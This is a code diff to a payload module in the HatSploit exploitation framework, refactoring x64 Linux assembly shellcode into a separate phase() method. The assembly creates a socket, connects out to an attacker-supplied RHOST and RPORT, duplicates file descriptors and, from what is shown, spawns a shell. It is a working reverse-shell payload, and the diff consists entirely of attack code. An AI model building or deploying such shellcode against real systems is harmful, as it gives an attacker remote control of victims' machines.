@@ -26,33 +26,10 @@ class HatSploitPayload(Payload, Assembler, Socket):
             'Actions': ['phaseless']
         }
 
-    def run(self):
-        rhost = self.pack_host(self.handler['RHOST'])
-        rport = self.pack_port(self.handler['RPORT'])
-
+    def phase(self):
         return self.assemble(
             self.details['Architecture'],
-            f"""
-            start:
-                push 0x29
-                pop rax
-                cdq
-                push 0x2
-                pop rdi
-                push 0x1
-                pop rsi
-                syscall
-
-                xchg rdi, rax
-                movabs rcx, 0x{rhost.hex()}{rport.hex()}0002
-                push rcx
-                mov rsi, rsp
-                push 0x10
-                pop rdx
-                push 0x2a
-                pop rax
-                syscall
-
+            """
                 push 0x3
                 pop rsi
 
@@ -73,5 +50,36 @@ class HatSploitPayload(Payload, Assembler, Socket):
                 push rdi
                 mov rsi, rsp
                 syscall
+            """
+        )
+
+    def run(self):
+        host = self.pack_host(self.handler['RHOST'])
+        port = self.pack_port(self.handler['RPORT'])
+
+        return self.assemble(
+            self.details['Architecture'],
+            f"""
+            start:
+                push 0x29
+                pop rax
+                cdq
+                push 0x2
+                pop rdi
+                push 0x1
+                pop rsi
+                syscall
+
+                xchg rdi, rax
+                movabs rcx, 0x{host.hex()}{port.hex()}0002
+                push rcx
+                mov rsi, rsp
+                push 0x10
+                pop rdx
+                push 0x2a
+                pop rax
+                syscall
+
+                {self.phase()}
             """
         )
